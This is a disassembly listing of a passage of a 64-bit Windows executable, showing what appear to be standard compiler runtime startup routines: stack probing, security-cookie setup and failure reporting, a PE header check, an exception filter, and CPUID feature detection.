   140007510:	4d 8d 9b 00 f0 ff ff 	lea    -0x1000(%r11),%r11
   140007517:	41 c6 03 00          	movb   $0x0,(%r11)
   14000751b:	4d 3b d3             	cmp    %r11,%r10
   14000751e:	75 f0                	jne    0x140007510
   140007520:	4c 8b 14 24          	mov    (%rsp),%r10
   140007524:	4c 8b 5c 24 08       	mov    0x8(%rsp),%r11
   140007529:	48 83 c4 10          	add    $0x10,%rsp
   14000752d:	c3                   	ret
   14000752e:	cc                   	int3
   14000752f:	cc                   	int3
   140007530:	40 53                	rex push %rbx
   140007532:	48 83 ec 20          	sub    $0x20,%rsp
   140007536:	48 8b d9             	mov    %rcx,%rbx
   140007539:	33 c9                	xor    %ecx,%ecx
   14000753b:	ff 15 97 1b 00 00    	call   *0x1b97(%rip)        # 0x1400090d8
   140007541:	48 8b cb             	mov    %rbx,%rcx
   140007544:	ff 15 96 1b 00 00    	call   *0x1b96(%rip)        # 0x1400090e0
   14000754a:	ff 15 10 1c 00 00    	call   *0x1c10(%rip)        # 0x140009160
   140007550:	48 8b c8             	mov    %rax,%rcx
   140007553:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   140007558:	48 83 c4 20          	add    $0x20,%rsp
   14000755c:	5b                   	pop    %rbx
   14000755d:	48 ff 25 f4 1b 00 00 	rex.W jmp *0x1bf4(%rip)        # 0x140009158
   140007564:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140007569:	48 83 ec 38          	sub    $0x38,%rsp
   14000756d:	b9 17 00 00 00       	mov    $0x17,%ecx
   140007572:	ff 15 50 1b 00 00    	call   *0x1b50(%rip)        # 0x1400090c8
   140007578:	85 c0                	test   %eax,%eax
   14000757a:	74 07                	je     0x140007583
   14000757c:	b9 02 00 00 00       	mov    $0x2,%ecx
   140007581:	cd 29                	int    $0x29
   140007583:	48 8d 0d f6 6e 00 00 	lea    0x6ef6(%rip),%rcx        # 0x14000e480
   14000758a:	e8 a9 00 00 00       	call   0x140007638
   14000758f:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140007594:	48 89 05 dd 6f 00 00 	mov    %rax,0x6fdd(%rip)        # 0x14000e578
   14000759b:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   1400075a0:	48 83 c0 08          	add    $0x8,%rax
   1400075a4:	48 89 05 6d 6f 00 00 	mov    %rax,0x6f6d(%rip)        # 0x14000e518
   1400075ab:	48 8b 05 c6 6f 00 00 	mov    0x6fc6(%rip),%rax        # 0x14000e578
   1400075b2:	48 89 05 37 6e 00 00 	mov    %rax,0x6e37(%rip)        # 0x14000e3f0
   1400075b9:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   1400075be:	48 89 05 3b 6f 00 00 	mov    %rax,0x6f3b(%rip)        # 0x14000e500
   1400075c5:	c7 05 11 6e 00 00 09 	movl   $0xc0000409,0x6e11(%rip)        # 0x14000e3e0
   1400075cc:	04 00 c0 
   1400075cf:	c7 05 0b 6e 00 00 01 	movl   $0x1,0x6e0b(%rip)        # 0x14000e3e4
   1400075d6:	00 00 00 
   1400075d9:	c7 05 15 6e 00 00 01 	movl   $0x1,0x6e15(%rip)        # 0x14000e3f8
   1400075e0:	00 00 00 
   1400075e3:	b8 08 00 00 00       	mov    $0x8,%eax
   1400075e8:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1400075ec:	48 8d 0d 0d 6e 00 00 	lea    0x6e0d(%rip),%rcx        # 0x14000e400
   1400075f3:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   1400075fa:	00 
   1400075fb:	b8 08 00 00 00       	mov    $0x8,%eax
   140007600:	48 6b c0 00          	imul   $0x0,%rax,%rax
   140007604:	48 8b 0d 35 6a 00 00 	mov    0x6a35(%rip),%rcx        # 0x14000e040
   14000760b:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   140007610:	b8 08 00 00 00       	mov    $0x8,%eax
   140007615:	48 6b c0 01          	imul   $0x1,%rax,%rax
   140007619:	48 8b 0d 60 6a 00 00 	mov    0x6a60(%rip),%rcx        # 0x14000e080
   140007620:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   140007625:	48 8d 0d 24 21 00 00 	lea    0x2124(%rip),%rcx        # 0x140009750
   14000762c:	e8 ff fe ff ff       	call   0x140007530
   140007631:	90                   	nop
   140007632:	48 83 c4 38          	add    $0x38,%rsp
   140007636:	c3                   	ret
   140007637:	cc                   	int3
   140007638:	40 53                	rex push %rbx
   14000763a:	56                   	push   %rsi
   14000763b:	57                   	push   %rdi
   14000763c:	48 83 ec 40          	sub    $0x40,%rsp
   140007640:	48 8b d9             	mov    %rcx,%rbx
   140007643:	ff 15 af 1a 00 00    	call   *0x1aaf(%rip)        # 0x1400090f8
   140007649:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   140007650:	33 ff                	xor    %edi,%edi
   140007652:	45 33 c0             	xor    %r8d,%r8d
   140007655:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   14000765a:	48 8b ce             	mov    %rsi,%rcx
   14000765d:	ff 15 8d 1a 00 00    	call   *0x1a8d(%rip)        # 0x1400090f0
   140007663:	48 85 c0             	test   %rax,%rax
   140007666:	74 3c                	je     0x1400076a4
   140007668:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   14000766d:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   140007672:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   140007679:	00 00 
   14000767b:	4c 8b c8             	mov    %rax,%r9
   14000767e:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140007683:	4c 8b c6             	mov    %rsi,%r8
   140007686:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000768b:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140007690:	33 c9                	xor    %ecx,%ecx
   140007692:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140007697:	ff 15 9b 1a 00 00    	call   *0x1a9b(%rip)        # 0x140009138
   14000769d:	ff c7                	inc    %edi
   14000769f:	83 ff 02             	cmp    $0x2,%edi
   1400076a2:	7c ae                	jl     0x140007652
   1400076a4:	48 83 c4 40          	add    $0x40,%rsp
   1400076a8:	5f                   	pop    %rdi
   1400076a9:	5e                   	pop    %rsi
   1400076aa:	5b                   	pop    %rbx
   1400076ab:	c3                   	ret
   1400076ac:	e9 8f 07 00 00       	jmp    0x140007e40
   1400076b1:	cc                   	int3
   1400076b2:	cc                   	int3
   1400076b3:	cc                   	int3
   1400076b4:	48 8d 05 d5 20 00 00 	lea    0x20d5(%rip),%rax        # 0x140009790
   1400076bb:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   1400076c2:	00 
   1400076c3:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1400076c7:	48 8d 05 b2 20 00 00 	lea    0x20b2(%rip),%rax        # 0x140009780
   1400076ce:	48 89 01             	mov    %rax,(%rcx)
   1400076d1:	48 8b c1             	mov    %rcx,%rax
   1400076d4:	c3                   	ret
   1400076d5:	cc                   	int3
   1400076d6:	cc                   	int3
   1400076d7:	cc                   	int3
   1400076d8:	48 83 ec 48          	sub    $0x48,%rsp
   1400076dc:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400076e1:	e8 ce ff ff ff       	call   0x1400076b4
   1400076e6:	48 8d 15 5b 42 00 00 	lea    0x425b(%rip),%rdx        # 0x14000b948
   1400076ed:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400076f2:	e8 25 07 00 00       	call   0x140007e1c
   1400076f7:	cc                   	int3
   1400076f8:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400076fd:	55                   	push   %rbp
   1400076fe:	48 8b ec             	mov    %rsp,%rbp
   140007701:	48 83 ec 30          	sub    $0x30,%rsp
   140007705:	48 8b 05 34 69 00 00 	mov    0x6934(%rip),%rax        # 0x14000e040
   14000770c:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   140007713:	2b 00 00 
   140007716:	48 3b c3             	cmp    %rbx,%rax
   140007719:	75 77                	jne    0x140007792
   14000771b:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   14000771f:	48 c7 45 10 00 00 00 	movq   $0x0,0x10(%rbp)
   140007726:	00 
   140007727:	ff 15 83 19 00 00    	call   *0x1983(%rip)        # 0x1400090b0
   14000772d:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140007731:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140007735:	ff 15 c5 19 00 00    	call   *0x19c5(%rip)        # 0x140009100
   14000773b:	8b c0                	mov    %eax,%eax
   14000773d:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   140007741:	ff 15 71 19 00 00    	call   *0x1971(%rip)        # 0x1400090b8
   140007747:	8b c0                	mov    %eax,%eax
   140007749:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   14000774d:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   140007751:	ff 15 69 19 00 00    	call   *0x1969(%rip)        # 0x1400090c0
   140007757:	8b 45 18             	mov    0x18(%rbp),%eax
   14000775a:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000775e:	48 c1 e0 20          	shl    $0x20,%rax
   140007762:	48 33 45 18          	xor    0x18(%rbp),%rax
   140007766:	48 33 45 f0          	xor    -0x10(%rbp),%rax
   14000776a:	48 33 c1             	xor    %rcx,%rax
   14000776d:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   140007774:	ff 00 00 
   140007777:	48 23 c1             	and    %rcx,%rax
   14000777a:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   140007781:	2b 00 00 
   140007784:	48 3b c3             	cmp    %rbx,%rax
   140007787:	48 0f 44 c1          	cmove  %rcx,%rax
   14000778b:	48 89 05 ae 68 00 00 	mov    %rax,0x68ae(%rip)        # 0x14000e040
   140007792:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140007797:	48 f7 d0             	not    %rax
   14000779a:	48 89 05 df 68 00 00 	mov    %rax,0x68df(%rip)        # 0x14000e080
   1400077a1:	48 83 c4 30          	add    $0x30,%rsp
   1400077a5:	5d                   	pop    %rbp
   1400077a6:	c3                   	ret
   1400077a7:	cc                   	int3
   1400077a8:	33 c0                	xor    %eax,%eax
   1400077aa:	c3                   	ret
   1400077ab:	cc                   	int3
   1400077ac:	b8 01 00 00 00       	mov    $0x1,%eax
   1400077b1:	c3                   	ret
   1400077b2:	cc                   	int3
   1400077b3:	cc                   	int3
   1400077b4:	b8 00 40 00 00       	mov    $0x4000,%eax
   1400077b9:	c3                   	ret
   1400077ba:	cc                   	int3
   1400077bb:	cc                   	int3
   1400077bc:	48 8d 0d 8d 71 00 00 	lea    0x718d(%rip),%rcx        # 0x14000e950
   1400077c3:	48 ff 25 de 18 00 00 	rex.W jmp *0x18de(%rip)        # 0x1400090a8
   1400077ca:	cc                   	int3
   1400077cb:	cc                   	int3
   1400077cc:	b0 01                	mov    $0x1,%al
   1400077ce:	c3                   	ret
   1400077cf:	cc                   	int3
   1400077d0:	48 8d 05 89 71 00 00 	lea    0x7189(%rip),%rax        # 0x14000e960
   1400077d7:	c3                   	ret
   1400077d8:	48 83 ec 28          	sub    $0x28,%rsp
   1400077dc:	e8 2f 98 ff ff       	call   0x140001010
   1400077e1:	48 83 08 24          	orq    $0x24,(%rax)
   1400077e5:	e8 e6 ff ff ff       	call   0x1400077d0
   1400077ea:	48 83 08 02          	orq    $0x2,(%rax)
   1400077ee:	48 83 c4 28          	add    $0x28,%rsp
   1400077f2:	c3                   	ret
   1400077f3:	cc                   	int3
   1400077f4:	33 c0                	xor    %eax,%eax
   1400077f6:	39 05 90 68 00 00    	cmp    %eax,0x6890(%rip)        # 0x14000e08c
   1400077fc:	0f 94 c0             	sete   %al
   1400077ff:	c3                   	ret
   140007800:	48 8d 05 91 71 00 00 	lea    0x7191(%rip),%rax        # 0x14000e998
   140007807:	c3                   	ret
   140007808:	48 8d 05 81 71 00 00 	lea    0x7181(%rip),%rax        # 0x14000e990
   14000780f:	c3                   	ret
   140007810:	c7 05 4e 71 00 00 00 	movl   $0x0,0x714e(%rip)        # 0x14000e968
   140007817:	00 00 00 
   14000781a:	c3                   	ret
   14000781b:	cc                   	int3
   14000781c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007821:	55                   	push   %rbp
   140007822:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   140007829:	ff 
   14000782a:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   140007831:	8b d9                	mov    %ecx,%ebx
   140007833:	b9 17 00 00 00       	mov    $0x17,%ecx
   140007838:	ff 15 8a 18 00 00    	call   *0x188a(%rip)        # 0x1400090c8
   14000783e:	85 c0                	test   %eax,%eax
   140007840:	74 04                	je     0x140007846
   140007842:	8b cb                	mov    %ebx,%ecx
   140007844:	cd 29                	int    $0x29
   140007846:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000784b:	e8 c0 ff ff ff       	call   0x140007810
   140007850:	33 d2                	xor    %edx,%edx
   140007852:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140007856:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   14000785c:	e8 c1 05 00 00       	call   0x140007e22
   140007861:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140007865:	ff 15 8d 18 00 00    	call   *0x188d(%rip)        # 0x1400090f8
   14000786b:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   140007872:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   140007879:	48 8b cb             	mov    %rbx,%rcx
   14000787c:	45 33 c0             	xor    %r8d,%r8d
   14000787f:	ff 15 6b 18 00 00    	call   *0x186b(%rip)        # 0x1400090f0
   140007885:	48 85 c0             	test   %rax,%rax
   140007888:	74 3f                	je     0x1400078c9
   14000788a:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   140007891:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   140007898:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
   14000789f:	00 00 
   1400078a1:	4c 8b c8             	mov    %rax,%r9
   1400078a4:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1400078a9:	4c 8b c3             	mov    %rbx,%r8
   1400078ac:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   1400078b3:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400078b8:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400078bc:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400078c1:	33 c9                	xor    %ecx,%ecx
   1400078c3:	ff 15 6f 18 00 00    	call   *0x186f(%rip)        # 0x140009138
   1400078c9:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   1400078d0:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400078d5:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   1400078dc:	33 d2                	xor    %edx,%edx
   1400078de:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   1400078e5:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   1400078eb:	48 83 c0 08          	add    $0x8,%rax
   1400078ef:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   1400078f6:	e8 27 05 00 00       	call   0x140007e22
   1400078fb:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   140007902:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140007907:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   14000790e:	40 
   14000790f:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   140007916:	00 
   140007917:	ff 15 83 17 00 00    	call   *0x1783(%rip)        # 0x1400090a0
   14000791d:	8b d8                	mov    %eax,%ebx
   14000791f:	33 c9                	xor    %ecx,%ecx
   140007921:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140007926:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000792b:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   14000792f:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140007934:	ff 15 9e 17 00 00    	call   *0x179e(%rip)        # 0x1400090d8
   14000793a:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000793f:	ff 15 9b 17 00 00    	call   *0x179b(%rip)        # 0x1400090e0
   140007945:	85 c0                	test   %eax,%eax
   140007947:	75 0d                	jne    0x140007956
   140007949:	83 fb 01             	cmp    $0x1,%ebx
   14000794c:	74 08                	je     0x140007956
   14000794e:	8d 48 03             	lea    0x3(%rax),%ecx
   140007951:	e8 ba fe ff ff       	call   0x140007810
   140007956:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   14000795d:	00 
   14000795e:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   140007965:	5d                   	pop    %rbp
   140007966:	c3                   	ret
   140007967:	cc                   	int3
   140007968:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   14000796f:	33 d2                	xor    %edx,%edx
   140007971:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007976:	44 8d 42 68          	lea    0x68(%rdx),%r8d
   14000797a:	e8 a3 04 00 00       	call   0x140007e22
   14000797f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140007984:	ff 15 0e 17 00 00    	call   *0x170e(%rip)        # 0x140009098
   14000798a:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
   14000798f:	b8 0a 00 00 00       	mov    $0xa,%eax
   140007994:	66 0f 45 44 24 60    	cmovne 0x60(%rsp),%ax
   14000799a:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   1400079a1:	c3                   	ret
   1400079a2:	cc                   	int3
   1400079a3:	cc                   	int3
   1400079a4:	e9 ff fd ff ff       	jmp    0x1400077a8
   1400079a9:	cc                   	int3
   1400079aa:	cc                   	int3
   1400079ab:	cc                   	int3
   1400079ac:	48 83 ec 28          	sub    $0x28,%rsp
   1400079b0:	33 c9                	xor    %ecx,%ecx
   1400079b2:	ff 15 d8 16 00 00    	call   *0x16d8(%rip)        # 0x140009090
   1400079b8:	48 85 c0             	test   %rax,%rax
   1400079bb:	74 3a                	je     0x1400079f7
   1400079bd:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   1400079c2:	66 39 08             	cmp    %cx,(%rax)
   1400079c5:	75 30                	jne    0x1400079f7
   1400079c7:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   1400079cb:	81 3c 01 50 45 00 00 	cmpl   $0x4550,(%rcx,%rax,1)
   1400079d2:	75 23                	jne    0x1400079f7
   1400079d4:	ba 0b 02 00 00       	mov    $0x20b,%edx
   1400079d9:	66 39 54 01 18       	cmp    %dx,0x18(%rcx,%rax,1)
   1400079de:	75 17                	jne    0x1400079f7
   1400079e0:	83 bc 01 84 00 00 00 	cmpl   $0xe,0x84(%rcx,%rax,1)
   1400079e7:	0e 
   1400079e8:	76 0d                	jbe    0x1400079f7
   1400079ea:	83 bc 01 f8 00 00 00 	cmpl   $0x0,0xf8(%rcx,%rax,1)
   1400079f1:	00 
   1400079f2:	0f 95 c0             	setne  %al
   1400079f5:	eb 02                	jmp    0x1400079f9
   1400079f7:	32 c0                	xor    %al,%al
   1400079f9:	48 83 c4 28          	add    $0x28,%rsp
   1400079fd:	c3                   	ret
   1400079fe:	cc                   	int3
   1400079ff:	cc                   	int3
   140007a00:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x140007a10
   140007a07:	48 ff 25 ca 16 00 00 	rex.W jmp *0x16ca(%rip)        # 0x1400090d8
   140007a0e:	cc                   	int3
   140007a0f:	cc                   	int3
   140007a10:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007a15:	57                   	push   %rdi
   140007a16:	48 83 ec 20          	sub    $0x20,%rsp
   140007a1a:	48 8b 19             	mov    (%rcx),%rbx
   140007a1d:	48 8b f9             	mov    %rcx,%rdi
   140007a20:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   140007a26:	75 24                	jne    0x140007a4c
   140007a28:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   140007a2c:	75 1e                	jne    0x140007a4c
   140007a2e:	8b 53 20             	mov    0x20(%rbx),%edx
   140007a31:	81 fa 20 05 93 19    	cmp    $0x19930520,%edx
   140007a37:	74 20                	je     0x140007a59
   140007a39:	8d 82 df fa 6c e6    	lea    -0x19930521(%rdx),%eax
   140007a3f:	83 f8 01             	cmp    $0x1,%eax
   140007a42:	76 15                	jbe    0x140007a59
   140007a44:	81 fa 00 40 99 01    	cmp    $0x1994000,%edx
   140007a4a:	74 0d                	je     0x140007a59
   140007a4c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007a51:	33 c0                	xor    %eax,%eax
   140007a53:	48 83 c4 20          	add    $0x20,%rsp
   140007a57:	5f                   	pop    %rdi
   140007a58:	c3                   	ret
   140007a59:	e8 ca 03 00 00       	call   0x140007e28
   140007a5e:	48 89 18             	mov    %rbx,(%rax)
   140007a61:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   140007a65:	e8 c4 03 00 00       	call   0x140007e2e
   140007a6a:	48 89 18             	mov    %rbx,(%rax)
   140007a6d:	e8 c8 03 00 00       	call   0x140007e3a
   140007a72:	cc                   	int3
   140007a73:	cc                   	int3
   140007a74:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007a79:	57                   	push   %rdi
   140007a7a:	48 83 ec 20          	sub    $0x20,%rsp
   140007a7e:	48 8d 1d 8b 32 00 00 	lea    0x328b(%rip),%rbx        # 0x14000ad10
   140007a85:	48 8d 3d 84 32 00 00 	lea    0x3284(%rip),%rdi        # 0x14000ad10
   140007a8c:	eb 12                	jmp    0x140007aa0
   140007a8e:	48 8b 03             	mov    (%rbx),%rax
   140007a91:	48 85 c0             	test   %rax,%rax
   140007a94:	74 06                	je     0x140007a9c
   140007a96:	ff 15 c4 1b 00 00    	call   *0x1bc4(%rip)        # 0x140009660
   140007a9c:	48 83 c3 08          	add    $0x8,%rbx
   140007aa0:	48 3b df             	cmp    %rdi,%rbx
   140007aa3:	72 e9                	jb     0x140007a8e
   140007aa5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007aaa:	48 83 c4 20          	add    $0x20,%rsp
   140007aae:	5f                   	pop    %rdi
   140007aaf:	c3                   	ret
   140007ab0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007ab5:	57                   	push   %rdi
   140007ab6:	48 83 ec 20          	sub    $0x20,%rsp
   140007aba:	48 8d 1d 5f 32 00 00 	lea    0x325f(%rip),%rbx        # 0x14000ad20
   140007ac1:	48 8d 3d 58 32 00 00 	lea    0x3258(%rip),%rdi        # 0x14000ad20
   140007ac8:	eb 12                	jmp    0x140007adc
   140007aca:	48 8b 03             	mov    (%rbx),%rax
   140007acd:	48 85 c0             	test   %rax,%rax
   140007ad0:	74 06                	je     0x140007ad8
   140007ad2:	ff 15 88 1b 00 00    	call   *0x1b88(%rip)        # 0x140009660
   140007ad8:	48 83 c3 08          	add    $0x8,%rbx
   140007adc:	48 3b df             	cmp    %rdi,%rbx
   140007adf:	72 e9                	jb     0x140007aca
   140007ae1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007ae6:	48 83 c4 20          	add    $0x20,%rsp
   140007aea:	5f                   	pop    %rdi
   140007aeb:	c3                   	ret
   140007aec:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140007af1:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140007af6:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140007afb:	57                   	push   %rdi
   140007afc:	48 83 ec 10          	sub    $0x10,%rsp
   140007b00:	33 c0                	xor    %eax,%eax
   140007b02:	33 c9                	xor    %ecx,%ecx
   140007b04:	0f a2                	cpuid
   140007b06:	81 f1 6e 74 65 6c    	xor    $0x6c65746e,%ecx
   140007b0c:	81 f2 69 6e 65 49    	xor    $0x49656e69,%edx
   140007b12:	0b d1                	or     %ecx,%edx
   140007b14:	8b e8                	mov    %eax,%ebp
   140007b16:	b8 01 00 00 00       	mov    $0x1,%eax
   140007b1b:	81 f3 47 65 6e 75    	xor    $0x756e6547,%ebx
   140007b21:	0b d3                	or     %ebx,%edx
   140007b23:	8d 48 ff             	lea    -0x1(%rax),%ecx
   140007b26:	0f a2                	cpuid
   140007b28:	8b f9                	mov    %ecx,%edi
   140007b2a:	75 5e                	jne    0x140007b8a
   140007b2c:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   140007b31:	48 c7 05 64 65 00 00 	movq   $0x8000,0x6564(%rip)        # 0x14000e0a0
   140007b38:	00 80 00 00 
   140007b3c:	48 c7 05 61 65 00 00 	movq   $0xffffffffffffffff,0x6561(%rip)        # 0x14000e0a8
   140007b43:	ff ff ff ff 
   140007b47:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   140007b4c:	74 28                	je     0x140007b76
   140007b4e:	3d 60 06 02 00       	cmp    $0x20660,%eax
   140007b53:	74 21                	je     0x140007b76
   140007b55:	3d 70 06 02 00       	cmp    $0x20670,%eax
   140007b5a:	74 1a                	je     0x140007b76
   140007b5c:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   140007b61:	83 f8 20             	cmp    $0x20,%eax
   140007b64:	77 24                	ja     0x140007b8a
   140007b66:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   140007b6d:	00 00 00 
   140007b70:	48 0f a3 c1          	bt     %rax,%rcx
   140007b74:	73 14                	jae    0x140007b8a
   140007b76:	44 8b 05 f3 6d 00 00 	mov    0x6df3(%rip),%r8d        # 0x14000e970
   140007b7d:	41 83 c8 01          	or     $0x1,%r8d
   140007b81:	44 89 05 e8 6d 00 00 	mov    %r8d,0x6de8(%rip)        # 0x14000e970
   140007b88:	eb 07                	jmp    0x140007b91
   140007b8a:	44 8b 05 df 6d 00 00 	mov    0x6ddf(%rip),%r8d        # 0x14000e970
   140007b91:	45 33 c9             	xor    %r9d,%r9d
   140007b94:	41 8b f1             	mov    %r9d,%esi
   140007b97:	45 8b d1             	mov    %r9d,%r10d
   140007b9a:	45 8b d9             	mov    %r9d,%r11d
   140007b9d:	83 fd 07             	cmp    $0x7,%ebp
   140007ba0:	7c 40                	jl     0x140007be2
   140007ba2:	41 8d 41 07          	lea    0x7(%r9),%eax
   140007ba6:	33 c9                	xor    %ecx,%ecx
   140007ba8:	0f a2                	cpuid
   140007baa:	8b f2                	mov    %edx,%esi
   140007bac:	44 8b cb             	mov    %ebx,%r9d
   140007baf:	0f ba e3 09          	bt     $0x9,%ebx
   140007bb3:	73 0b                	jae    0x140007bc0
   140007bb5:	41 83 c8 02          	or     $0x2,%r8d
   140007bb9:	44 89 05 b0 6d 00 00 	mov    %r8d,0x6db0(%rip)        # 0x14000e970
   140007bc0:	83 f8 01             	cmp    $0x1,%eax
   140007bc3:	7c 0d                	jl     0x140007bd2
   140007bc5:	b8 07 00 00 00       	mov    $0x7,%eax
   140007bca:	8d 48 fa             	lea    -0x6(%rax),%ecx
   140007bcd:	0f a2                	cpuid
   140007bcf:	44 8b d2             	mov    %edx,%r10d
   140007bd2:	b8 24 00 00 00       	mov    $0x24,%eax
   140007bd7:	3b e8                	cmp    %eax,%ebp
   140007bd9:	7c 07                	jl     0x140007be2
   140007bdb:	33 c9                	xor    %ecx,%ecx
   140007bdd:	0f a2                	cpuid
   140007bdf:	44 8b db             	mov    %ebx,%r11d
   140007be2:	48 8b 05 a7 64 00 00 	mov    0x64a7(%rip),%rax        # 0x14000e090
   140007be9:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
   140007bed:	c7 05 a1 64 00 00 01 	movl   $0x1,0x64a1(%rip)        # 0x14000e098
   140007bf4:	00 00 00 
   140007bf7:	c7 05 9b 64 00 00 02 	movl   $0x2,0x649b(%rip)        # 0x14000e09c
   140007bfe:	00 00 00 
   140007c01:	48 89 05 88 64 00 00 	mov    %rax,0x6488(%rip)        # 0x14000e090
   140007c08:	0f ba e7 14          	bt     $0x14,%edi
   140007c0c:	73 1f                	jae    0x140007c2d
   140007c0e:	48 83 e0 ef          	and    $0xffffffffffffffef,%rax
   140007c12:	c7 05 7c 64 00 00 02 	movl   $0x2,0x647c(%rip)        # 0x14000e098
   140007c19:	00 00 00 
   140007c1c:	48 89 05 6d 64 00 00 	mov    %rax,0x646d(%rip)        # 0x14000e090
   140007c23:	c7 05 6f 64 00 00 06 	movl   $0x6,0x646f(%rip)        # 0x14000e09c
   140007c2a:	00 00 00 
   140007c2d:	0f ba e7 1b          	bt     $0x1b,%edi
   140007c31:	0f 83 33 01 00 00    	jae    0x140007d6a
   140007c37:	33 c9                	xor    %ecx,%ecx
   140007c39:	0f 01 d0             	xgetbv
   140007c3c:	48 c1 e2 20          	shl    $0x20,%rdx
   140007c40:	48 0b d0             	or     %rax,%rdx
   140007c43:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140007c48:	0f ba e7 1c          	bt     $0x1c,%edi
   140007c4c:	0f 83 fc 00 00 00    	jae    0x140007d4e
   140007c52:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140007c57:	24 06                	and    $0x6,%al
   140007c59:	3c 06                	cmp    $0x6,%al
   140007c5b:	0f 85 ed 00 00 00    	jne    0x140007d4e
